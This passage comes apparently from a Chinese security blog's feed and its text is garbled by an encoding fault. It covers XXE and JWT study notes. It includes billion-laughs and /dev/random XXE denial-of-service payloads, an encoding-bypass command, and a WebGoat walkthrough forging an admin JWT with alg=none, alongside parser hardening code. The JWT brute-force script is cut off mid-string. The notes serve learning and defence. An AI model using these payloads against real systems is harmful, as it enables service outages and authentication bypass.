&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; </span><br></pre></td></tr></table></figure><p>æ­¤æµ‹è¯•å¯ä»¥åœ¨å†…å­˜ä¸­å°†å°å‹ XML æ–‡æ¡£æ‰©å±•åˆ°è¶…è¿‡ 3GB è€Œä½¿æœåŠ¡å™¨å´©æºƒã€‚<br>äº¦æˆ–è€…ï¼Œå¦‚æœç›®æ ‡æ˜¯UNIXç³»ç»Ÿï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœ XML è§£æå™¨å°è¯•ä½¿ç”¨<code>/dev/random</code>æ–‡ä»¶ä¸­çš„å†…å®¹æ¥æ›¿ä»£å®ä½“ï¼Œåˆ™æ­¤ç¤ºä¾‹ä¼šä½¿æœåŠ¡å™¨ï¼ˆä½¿ç”¨ UNIX ç³»ç»Ÿï¼‰å´©æºƒã€‚</p><h4 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h4><ul><li>pharåè®®ååºåˆ—åŒ–</li><li><a href="https://xz.aliyun.com/t/3741">åˆ©ç”¨EXCELè¿›è¡ŒXXEæ”»å‡»</a></li><li>ä¸Šä¼ svgï¼Œdocxç­‰xmlæ ¼å¼çš„æ–‡ä»¶è¿›è¡Œæ”»å‡»</li><li>javaâ€“jaråè®®è§£å‹å‹ç¼©åŒ…</li></ul><h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><ul><li><p>æ’å…¥ç©ºæ ¼</p><p>å¯ä»¥åœ¨<code>&lt;?xml</code>æˆ–<code>&lt;!DOCTYPE</code>åæ’å…¥ä»»æ„æ•°é‡çš„ç©ºæ ¼</p><p><img src="/../images/image-20230605205020027.png" alt="image-20230605205020027"></p></li><li><p>ç¼–ç ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UTF-7</span><br><span class="line">UTF-16â€ŠBEï¼ŒUTF-16â€ŠLE</span><br><span class="line">UTF-32â€ŠBEã€UTF-32LEã€UTF-322143ã€UTF-323412</span><br><span class="line">EBCDIC</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat payload.xml | iconv -f utf-8 -t utf-7 &gt; payload.7.xml</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230606145117482.png" alt="image-20230606145117482"></p></li></ul><h3 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h3><p><a href="https://www.cnblogs.com/bmjoker/p/9614990.html">7.XXEinjectorï¼šä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„è‡ªåŠ¨åŒ–XXEæ³¨å°„å·¥å…· - bmjoker - åšå®¢å›­ (cnblogs.com)</a></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><ul><li>ç¦ç”¨å¤–éƒ¨å®ä½“</li></ul><p>PHP: </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>); </span><br></pre></td></tr></table></figure><p>JAVA: </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SAXBuilder</span></span><br><span class="line"><span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// DocumentBuilder</span></span><br><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>  DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">documentBuilder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// SAXReader</span></span><br><span class="line"><span class="type">SAXReader</span> <span class="variable">saxReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXReader</span>();</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// SAXTransformerFactory</span></span><br><span class="line"><span class="type">SAXTransformerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// TransformerFactory</span></span><br><span class="line"><span class="type">TransformerFactory</span> <span class="variable">tf</span> <span class="operator">=</span> TransformerFactory.newInstance();      </span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unmarshaller é»˜è®¤æ–¹æ³•ä¸å­˜åœ¨xxeæ¼æ´</span></span><br></pre></td></tr></table></figure><p> Pythonï¼š </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><ul><li>è¿‡æ»¤ç”¨æˆ·æäº¤çš„ XML æ•°æ®</li></ul><p>å¦‚è¿‡æ»¤å…³é”®è¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE å’Œ&lt;!ENTITYï¼Œæˆ–è€… SYSTEM å’Œ PUBLIC</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h1><p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p><p><a href="https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p><p><a href="https://xz.aliyun.com/t/6829#toc-4">https://xz.aliyun.com/t/6829#toc-4</a></p><p><strong>è¡¥å……</strong>ï¼š<a href="https://tttang.com/archive/1813/#toc__2">https://tttang.com/archive/1813/#toc__2</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JWTå®‰å…¨</title>
      <link href="/2023/06/01/JWT%E4%BB%A4%E7%89%8C/"/>
      <url>/2023/06/01/JWT%E4%BB%A4%E7%89%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="JWTè®¤è¯†"><a href="#JWTè®¤è¯†" class="headerlink" title="JWTè®¤è¯†"></a>JWTè®¤è¯†</h1><h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><p>JSON Web Tokenï¼ˆJSON Web ä»¤ç‰Œï¼‰æ˜¯ä¸€ç§è·¨åŸŸéªŒè¯èº«ä»½çš„æ–¹æ¡ˆã€‚JWT ä¸åŠ å¯†ä¼ è¾“çš„æ•°æ®ï¼Œä½†èƒ½å¤Ÿé€šè¿‡æ•°å­—ç­¾åæ¥éªŒè¯æ•°æ®æœªè¢«ç¯¡æ”¹ã€‚</p><h2 id="ä»¤ç‰Œå·¥ä½œæµç¨‹"><a href="#ä»¤ç‰Œå·¥ä½œæµç¨‹" class="headerlink" title="ä»¤ç‰Œå·¥ä½œæµç¨‹"></a>ä»¤ç‰Œå·¥ä½œæµç¨‹</h2><p><img src="/../images/jwt-diagram.png" alt="jwt"></p><ol><li>æµè§ˆå™¨å‘èµ·è¯·æ±‚ç™»é™†</li><li>æœåŠ¡ç«¯éªŒè¯èº«ä»½ï¼Œæ ¹æ®ç®—æ³•ï¼Œå°†ç”¨æˆ·æ ‡è¯†ç¬¦æ‰“åŒ…ç”Ÿæˆ token, å¹¶ä¸”è¿”å›ç»™æµè§ˆå™¨</li><li>æµè§ˆå™¨å‘èµ·è¯·æ±‚è·å–ç”¨æˆ·èµ„æ–™ï¼ŒæŠŠåˆšåˆšæ‹¿åˆ°çš„ token ä¸€èµ·å‘é€ç»™æœåŠ¡å™¨</li><li>æœåŠ¡å™¨å‘ç°æ•°æ®ä¸­æœ‰ tokenï¼ŒéªŒè¯ç­¾åå¹¶è¯†åˆ«ç”¨æˆ·èº«ä»½</li><li>æœåŠ¡å™¨è¿”å›è¯¥ç”¨æˆ·çš„ç”¨æˆ·èµ„æ–™</li></ol><h2 id="ç»„æˆ"><a href="#ç»„æˆ" class="headerlink" title="ç»„æˆ"></a>ç»„æˆ</h2><p>JWT åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œå¤´éƒ¨ï¼ˆHeaderï¼‰ï¼Œå£°æ˜ï¼ˆClaimsï¼‰ï¼Œç­¾åï¼ˆSignatureï¼‰ï¼Œä¸‰ä¸ªéƒ¨åˆ†ä»¥è‹±æ–‡å¥å·.éš”å¼€ã€‚ </p><p><img src="/../images/jwt_token.png" alt="JWT"></p><p>hearderå’ŒClaims çš„å†…å®¹ä»¥ Base64URL è¿›è¡Œäº†ç¼–ç ã€‚</p><blockquote><p>Base64URL  From ç»´åŸºç™¾ç§‘</p></blockquote><p><img src="/../images/image-20230607163309054.png" alt="image-20230607163309054"></p><h3 id="å¤´éƒ¨ï¼ˆHeaderï¼‰"><a href="#å¤´éƒ¨ï¼ˆHeaderï¼‰" class="headerlink" title="å¤´éƒ¨ï¼ˆHeaderï¼‰"></a>å¤´éƒ¨ï¼ˆHeaderï¼‰</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span><span class="string">&quot;webgoat_key&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜:</p><ul><li>algorithmï¼ˆalgï¼‰ :è¯´æ˜JWTç­¾åä½¿ç”¨çš„ç®—æ³•ï¼Œå¸¸è§æœ‰HS256ï¼ˆé»˜è®¤ï¼‰ï¼ŒRS256 ç­‰ï¼Œä¹Ÿå¯ä»¥ä¸º Noneä¸è¿›è¡Œç­¾åã€‚</li><li>kidï¼šç”¨æ¥æŒ‡å®šéªŒè¯ç­¾åçš„å¯†é’¥</li><li>typ:è¯´æ˜è¿™ä¸ª token çš„ç±»å‹ä¸º JWT (å¯é€‰å‚æ•°)</li></ul><h3 id="å£°æ˜ï¼ˆClaimsï¼‰"><a href="#å£°æ˜ï¼ˆClaimsï¼‰" class="headerlink" title="å£°æ˜ï¼ˆClaimsï¼‰"></a>å£°æ˜ï¼ˆClaimsï¼‰</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line"> <span class="attr">&quot;secretid&quot;</span><span class="punctuation">:</span><span class="string">&quot; &quot;</span></span><br><span class="line"> <span class="attr">&quot;aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webgoat.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1644039735</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1644039795</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tom@webgoat.org&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span>xxx</span><br><span class="line"><span class="punctuation">&#125;</span> </span><br></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜ï¼š</p><ul><li>secretidï¼šå¯†é’¥idå€¼ï¼Œå½“å…¶ä¸ºç©ºæ—¶ï¼Œjwté»˜è®¤algä¸ºnone</li><li>audï¼šæ¥æ”¶jwtçš„ç”¨æˆ·</li><li>iatï¼šä»¤ç‰Œç”Ÿæ•ˆæ—¶é—´ </li><li>expï¼šä»¤ç‰Œåˆ°æœŸæ—¶é—´</li><li>subï¼šä¸»é¢˜</li><li>jtiï¼š jwtçš„å”¯ä¸€èº«ä»½æ ‡è¯†ï¼Œä¸»è¦ç”¨æ¥ä½œä¸ºä¸€æ¬¡æ€§token,ä»è€Œå›é¿é‡æ”¾æ”»å‡»</li><li>nbfï¼šå®šä¹‰åœ¨ä»€ä¹ˆæ—¶é—´ä¹‹å‰ï¼Œè¯¥jwtéƒ½æ˜¯ä¸å¯ç”¨çš„.</li></ul><p> æ–‡æ¡£ï¼š<a href="https://datatracker.ietf.org/doc/html/rfc7519#section-4.1">https://datatracker.ietf.org/doc/html/rfc7519#section-4.1</a></p><h3 id="ç­¾åï¼ˆSignatureï¼‰"><a href="#ç­¾åï¼ˆSignatureï¼‰" class="headerlink" title="ç­¾åï¼ˆSignatureï¼‰"></a>ç­¾åï¼ˆSignatureï¼‰</h3><p>â€‹æœåŠ¡å™¨æœ‰ä¸€ä¸ªä¸ä¼šå‘é€ç»™å®¢æˆ·ç«¯çš„å¯†ç ï¼ˆsecretï¼‰ï¼Œç”¨å¤´éƒ¨ä¸­æŒ‡å®šçš„ç®—æ³•å¯¹å¤´éƒ¨å’Œå£°æ˜çš„å†…å®¹ï¼ˆbase64ç¼–ç åçš„ï¼‰ç”¨æ­¤å¯†ç è¿›è¡ŒåŠ å¯†ï¼Œç”Ÿæˆçš„å­—ç¬¦ä¸²å°±æ˜¯ JWT çš„ç­¾åã€‚ </p><p>ä»¥HMAC SHA256ä¸ºä¾‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> + base64UrlEncode(claims),secret)</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><p>åœ¨http headerä¸­æ·»åŠ </p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer &lt;token&gt;</span><br></pre></td></tr></table></figure><h2 id="å®‰å…¨æ€§"><a href="#å®‰å…¨æ€§" class="headerlink" title="å®‰å…¨æ€§"></a>å®‰å…¨æ€§</h2><ul><li><p>é˜²ç¯¡æ”¹å–å†³äºç§é’¥å’ŒåŠ å¯†ç®—æ³•çš„å®‰å…¨æ€§ã€‚</p></li><li><p>å› ä¸ºç­¾åæ‰€ä»¥JWTèƒ½å¤Ÿé˜²ç¯¡æ”¹èµ·åˆ°è®¤è¯åŠŸèƒ½ï¼Œä½†æ˜¯å¯¹äºheaderå’ŒClaimséƒ¨åˆ†åªè¿›è¡Œäº†base64URLç¼–ç ï¼Œè¿™æ„å‘³ç€ä»»ä½•äººéƒ½å¯ä»¥è¯»å–åˆ°è¿™éƒ¨åˆ†çš„ä¿¡æ¯ï¼Œæ‰€ä»¥é™¤éåŠ å¯†ï¼Œå¦åˆ™ä¸è¦åœ¨JWTçš„æœ‰æ•ˆè´Ÿè½½æˆ–æŠ¥å¤´å…ƒç´ ä¸­æ”¾ç½®ç§˜å¯†ä¿¡æ¯ã€‚</p></li></ul><h1 id="å¦‚ä½•ç”ŸæˆJWT"><a href="#å¦‚ä½•ç”ŸæˆJWT" class="headerlink" title="å¦‚ä½•ç”ŸæˆJWT"></a>å¦‚ä½•ç”ŸæˆJWT</h1><ul><li><p>ç­¾åè§£æç½‘ç«™ <a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p></li><li><p>python</p><p>å®‰è£…æ¨¡å—</p><p><a href="https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode">https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip uninstall JWT </span><br><span class="line">pip uninstall PyJWT </span><br><span class="line">pip install PyJWT==<span class="number">1.7</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># è°ƒç”¨jwtåº“,ç”Ÿæˆjson web token</span></span><br><span class="line">jwt_token = jwt.encode(payload=payload,  <span class="comment"># payload, æœ‰æ•ˆè½½ä½“</span></span><br><span class="line">                       key=key,  <span class="comment"># è¿›è¡ŒåŠ å¯†ç­¾åçš„å¯†é’¥</span></span><br><span class="line">                       algorithm=<span class="string">&quot;HS256&quot;</span>,  <span class="comment"># æŒ‡æ˜ç­¾åç®—æ³•æ–¹å¼, é»˜è®¤ä¹Ÿæ˜¯HS256</span></span><br><span class="line">                       headers=headers  <span class="comment"># json web token æ•°æ®ç»“æ„åŒ…å«ä¸¤éƒ¨åˆ†, payload(æœ‰æ•ˆè½½ä½“), headers(æ ‡å¤´)</span></span><br><span class="line">                       ).decode(<span class="string">&#x27;ascii&#x27;</span>)  <span class="comment"># python3 ç¼–ç åå¾—åˆ° bytes, å†è¿›è¡Œè§£ç (æŒ‡æ˜è§£ç çš„æ ¼å¼), å¾—åˆ°ä¸€ä¸ªstr</span></span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br></pre></td></tr></table></figure></li></ul><h1 id="JWTæ£€æµ‹"><a href="#JWTæ£€æµ‹" class="headerlink" title="JWTæ£€æµ‹"></a>JWTæ£€æµ‹</h1><ul><li><p>JAVAweb</p></li><li><p>æ•°æ®åŒ…è¯·æ±‚å¤´</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer</span><br></pre></td></tr></table></figure></li><li><p>æ•°æ®åŒ…æ•°æ®æ ¼å¼</p></li></ul><h1 id="æ”»å‡»æ‰‹æ®µ"><a href="#æ”»å‡»æ‰‹æ®µ" class="headerlink" title="æ”»å‡»æ‰‹æ®µ"></a>æ”»å‡»æ‰‹æ®µ</h1><h3 id="ç­¾åç®—æ³•ç½®None"><a href="#ç­¾åç®—æ³•ç½®None" class="headerlink" title="ç­¾åç®—æ³•ç½®None"></a>ç­¾åç®—æ³•ç½®None</h3><h4 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h4><p>WebGoat JWT 5</p><p><img src="/../images/image-20230607173309475.png" alt="image-20230607173309475"></p><p>ç‚¹å‡»resetæŒ‰é’®ï¼ŒæŠ“å–æ•°æ®åŒ…ï¼Œå°†æ•°æ®åŒ…ä¸­çš„tokenè¿›è¡Œè§£å¯†</p><p><img src="/../images/image-20230607173408930.png" alt="image-20230607173408930"></p><p>å‘ç°åœ¨å£°æ˜éƒ¨åˆ†æœ‰adminå‚æ•°å€¼ä¸ºfalseï¼Œåº”è¯¥å°±æ˜¯æ ¹æ®è¿™ä¸ªæ¥åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸ºç®¡ç†å‘˜</p><p><strong>å°†adminå€¼ä¿®æ”¹ä¸ºtrue</strong></p><p>è¿™æ—¶å€™ä¿®æ”¹äº†å£°æ˜éƒ¨åˆ†çš„å†…å®¹ï¼Œç­¾åå°±å¤±æ•ˆäº†ï¼Œæ‰€ä»¥è¦ç»•è¿‡ç­¾åéªŒè¯</p><p><strong>å°†å¤´éƒ¨algå€¼æ”¹ä¸ºnoneï¼Œè®©æœåŠ¡å™¨ä¸è¿›è¡Œç­¾åéªŒè¯</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1686993728</span>,</span><br><span class="line">  <span class="string">&quot;admin&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">  <span class="string">&quot;user&quot;</span>: <span class="string">&quot;Jerry&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">,algorithm=<span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607174127468.png" alt="image-20230607174127468"></p><h4 id="å½¢æˆåŸå› "><a href="#å½¢æˆåŸå› " class="headerlink" title="å½¢æˆåŸå› "></a>å½¢æˆåŸå› </h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">   <span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br><span class="line">   <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> (Claims) jwt.getBody();</span><br><span class="line">   <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> (String) claims.get(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">   <span class="type">boolean</span> <span class="variable">isAdmin</span> <span class="operator">=</span> Boolean.valueOf((String) claims.get(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">   <span class="keyword">if</span> (isAdmin) &#123;</span><br><span class="line">     removeAllUsers();</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     log.error(<span class="string">&quot;You are not an admin user&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidTokenException</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®ç‚¹åœ¨äº</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨äº†é”™è¯¯çš„å‡½æ•°<code>parse(accessToken)</code>ï¼Œè€Œä¸æ˜¯<code>parseClaimsJws(accessToken)</code>ï¼Œå¯¼è‡´jwtéªŒè¯æˆåŠŸ</p><p>æ­£å¸¸æƒ…å†µä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Jwt</span> <span class="variable">jwt</span> <span class="operator">=</span> Jwts.parser().setSigningKey(JWT_PASSWORD).parseClaimsJws(accessToken);</span><br></pre></td></tr></table></figure><ul><li><code>Jwts.parser()</code> åˆ›å»ºäº†ä¸€ä¸ª<code>JwtParser</code>ç±»çš„å®ä¾‹ï¼Œç”¨äºè§£æå’ŒéªŒè¯JWTã€‚</li><li><code>setSigningKey(JWT_PASSWORD)</code> è®¾ç½®ç”¨äºç­¾åJWTçš„å¯†é’¥ã€‚<code>JWT_PASSWORD</code>å˜é‡åº”åŒ…å«ç”¨äºç­¾åJWTçš„ç›¸åŒå¯†é’¥ã€‚</li><li><code>parseClaimsJws(accessToken)</code> è§£æåŒ…å«åœ¨<code>accessToken</code>å˜é‡ä¸­çš„JWTï¼Œå¹¶å°†å…¶ä½œä¸º<code>Jws&lt;Claims&gt;</code>å¯¹è±¡è¿”å›ã€‚<code>Claims</code>å¯¹è±¡åŒ…å«JWTçš„æœ‰æ•ˆè´Ÿè½½ï¼Œé€šå¸¸åŒ…æ‹¬å…³äºç”¨æˆ·çš„ä¿¡æ¯ä»¥åŠæˆæƒè¯·æ±‚æ‰€éœ€çš„ä»»ä½•å…¶ä»–æ•°æ®ã€‚</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä½¿ç”¨æä¾›çš„å¯†é’¥æ— æ³•éªŒè¯JWTï¼Œåˆ™<code>parseClaimsJws()</code>æ–¹æ³•å°†æŠ›å‡º<code>SignatureException</code>ã€‚</p><h3 id="çˆ†ç ´å¯†é’¥â€“ä¿®æ”¹ç­¾å"><a href="#çˆ†ç ´å¯†é’¥â€“ä¿®æ”¹ç­¾å" class="headerlink" title="çˆ†ç ´å¯†é’¥â€“ä¿®æ”¹ç­¾å"></a>çˆ†ç ´å¯†é’¥â€“ä¿®æ”¹ç­¾å</h3><p>WebGoat JWT 10</p><p>å·¥å…·</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./jwtcrack JWTæ•°æ®</span><br><span class="line">hashcat</span><br></pre></td></tr></table></figure><p>pythonè„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    1.è‹¥ç­¾åç›´æ¥æ ¡éªŒæˆåŠŸï¼Œåˆ™ key_ ä¸ºæœ‰æ•ˆå¯†é’¥ï¼›</span></span><br><span class="line"><span class="string">    2.è‹¥å› æ•°æ®éƒ¨åˆ†é¢„å®šä¹‰å­—æ®µé”™è¯¯ï¼ˆjwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureErrorï¼‰å¯¼è‡´æ ¡éªŒå¤±è´¥ï¼Œè¯´æ˜å¹¶éå¯†é’¥é”™è¯¯å¯¼è‡´ï¼Œåˆ™ key_ ä¹Ÿä¸ºæœ‰æ•ˆå¯†é’¥ï¼›</span></span><br><span class="line"><span class="string">    3.è‹¥å› å¯†é’¥é”™è¯¯ï¼ˆjwt.exceptions.InvalidSignatureErrorï¼‰å¯¼è‡´æ ¡éªŒå¤±è´¥ï¼Œåˆ™ key_ ä¸ºæ— æ•ˆå¯†é’¥ï¼›</span></span><br><span class="line"><span class="string">    4.è‹¥ä¸ºå…¶ä»–åŸå› ï¼ˆå¦‚ï¼ŒJWT 